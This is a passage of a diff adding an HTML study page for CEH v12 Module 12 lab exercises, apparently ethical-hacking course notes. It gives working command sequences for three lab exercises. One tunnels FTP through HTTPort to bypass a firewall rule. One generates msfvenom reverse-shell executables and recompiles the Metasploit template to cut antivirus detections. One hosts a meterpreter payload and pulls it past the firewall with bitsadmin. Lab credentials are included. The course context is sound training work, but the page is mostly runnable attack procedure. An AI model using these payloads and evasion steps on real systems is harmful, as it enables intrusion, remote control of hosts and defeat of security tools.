+# Profile: Domain/Private/Public -&gt; Next
+# Name: Port 21 Blocked -&gt; Finish
+# right-click &quot;Port 21 Blocked&quot; -&gt; Properties -&gt; Protocols and Ports tab
+# Remote port: Specific Ports -&gt; 21 -&gt; Apply -&gt; OK
+
+# Test direct FTP (blocked)
+# right-click rule -&gt; Disable Rule
+# cmd: ftp 10.10.1.11   (connects; 10.10.1.11 = Windows 11 FTP host)
+# right-click rule -&gt; Enable Rule
+# cmd: ftp 10.10.1.11   (connection blocked)
+
+# Install and configure HTTPort on Windows Server 2019
+# navigate to Z:\CEHv12 Module 12 ...\HTTP Tunneling Tools\HTTPort
+# double-click httport3snfm.exe; UAC Yes; follow install wizard
+# launch HTTPort (Httport3SNFM) from Start menu
+# Introduction wizard: Next x5 -&gt; Close
+# Proxy tab:
+#   Host name or IP: 10.10.1.22 (HTTHost host) ; Port: 90
+#   Bypass mode: Remote host
+#   Use personal remote host at: 10.10.1.22 ; port 90
+#   Password: magic
+# Port mapping tab -&gt; Add
+#   right-click &quot;New mapping&quot; -&gt; Edit -&gt; rename &quot;ftp test&quot;
+#   Local port -&gt; Edit -&gt; 21
+#   Remote host -&gt; Edit -&gt; 10.10.1.11
+#   Remote port -&gt; Edit -&gt; 21
+# Proxy tab -&gt; Start (ignore errors if any)
+
+# Verify tunnel
+# cmd: ftp 10.10.1.11          (blocked by outbound rule)
+# cmd: ftp 127.0.0.1           (tunneled; connects via localhost)
+# login: Jason / qwerty
+# mkdir Test
+# Windows 11: verify &quot;Test&quot; folder in C:\FTP
+
+# Cleanup
+# delete outbound rule &quot;Port 21 Blocked&quot;
+# stop HTTHost and HTTPort
+# disable Windows Defender Firewall on Windows Server 2019
+# start World Wide Web Publishing Service and IIS Admin Service on Windows Server 2022
+</code></pre>                <p><strong>Bypass Antivirus using Metasploit Templates</strong> <span class="tool-tag">Metasploit (msfvenom) / VirusTotal / pluma / i686-w64-mingw32-gcc / Parrot Security</span></p>                <pre><code># Attacker: Parrot Security
+sudo su
+# password: toor (not visible)
+# generate standard payload
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Windows.exe
+# 10.10.1.13 = Parrot Security IP; may vary
+
+# VirusTotal check (standard payload)
+# browser -&gt; https://www.virustotal.com
+# Choose file -&gt; /home/attacker/Windows.exe -&gt; Open
+# Confirm upload -&gt; wait for analysis
+# observe detection count (e.g. 54/70)
+
+# Modify and recompile Metasploit PE template
+pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c
+# line 3: change payload size 4096 -&gt; 4000; Save; close editor
+cd /usr/share/metasploit-framework/data/templates/src/pe/exe/
+i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
+ls
+# confirm evasion.exe exists
+
+# Generate payload using modified template
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe &gt; /home/attacker/bypass.exe
+
+# VirusTotal check (modified payload)
+# VirusTotal -&gt; Upload file -&gt; /home/attacker/bypass.exe -&gt; Open
+# Confirm upload -&gt; wait for analysis
+# observe reduced detection count (e.g. 48/71)
+# close all windows
+</code></pre>                <p><strong>Bypass Firewall through Windows BITSAdmin</strong> <span class="tool-tag">BITSAdmin / msfvenom / Apache / Windows Server 2019 / Parrot Security / Windows PowerShell</span></p>                <pre><code># Target: Windows Server 2019 (turn on firewall)
+# Control Panel -&gt; System and Security -&gt; Windows Defender Firewall
+# Turn Windows Defender Firewall on or off -&gt; Turn on for Private + Public -&gt; OK
+
+# Attacker: Parrot Security
+sudo su
+# password: toor (not visible)
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Exploit.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/Exploit.exe /var/www/html/share
+service apache2 start
+
+# Target: Windows Server 2019 (download through firewall)
+# Type here to search -&gt; powershell -&gt; Windows PowerShell
+bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
+# BITSAdmin transfers the file; verify in File Explorer -&gt; C:\Exploit.exe
+# attacker can then use the file for access/privilege escalation
+# close all windows and document all acquired information
+</code></pre>            </div></section>
+        </div>
+    </main>
+    <script>
+        const body = document.body;
+        const applyTheme = (t) => {
+            if (t === 'dark') body.setAttribute('data-theme', 'dark');
+            else body.removeAttribute('data-theme');
+        };
+        function getTheme() {
+            try {
+                const p = new URLSearchParams(location.search);
+                const u = p.get('theme');
+                if (u === 'dark' || u === 'light') return u;
+            } catch (e) {}
+            try { return localStorage.getItem('theme') || 'light'; } catch (e) { return 'light'; }
+        }
+        applyTheme(getTheme());
+        const toggle = document.getElementById('themeToggle');
+        if (toggle) {
+            toggle.addEventListener('click', () => {
+                const newT = body.hasAttribute('data-theme') ? 'light' : 'dark';
+                applyTheme(newT);
+                try { localStorage.setItem('theme', newT); } catch (e) {}
+                try {
+                    const url = new URL(location.href);
+                    url.searchParams.set('theme', newT);
+                    history.replaceState(null, '', url.toString());
+                } catch (e) {}
+            });
+        }
+        const path = window.location.pathname.split('/').pop();
+        const navMap = {
+            'index.html': 'nav-index',
+            'module_02.html': 'nav-02',
+            'module_03.html': 'nav-03',
+            'module_04.html': 'nav-04',
+            'module_05.html': 'nav-05',
+            'module_06.html': 'nav-06',
+            'module_07.html': 'nav-07',
+            'module_08.html': 'nav-08',
+            'module_09.html': 'nav-09',
+            'module_10.html': 'nav-10',
+            'module_11.html': 'nav-11',
+            'module_12.html': 'nav-12',
+            'cheat_sheet.html': 'nav-cheat'
+        };
+        const navId = navMap[path] || 'nav-index';
+        const navEl = document.getElementById(navId);
+        if (navEl) navEl.classList.add('active');
+    </script>
+    <script src="app.js"></script>
+</body>
+</html>
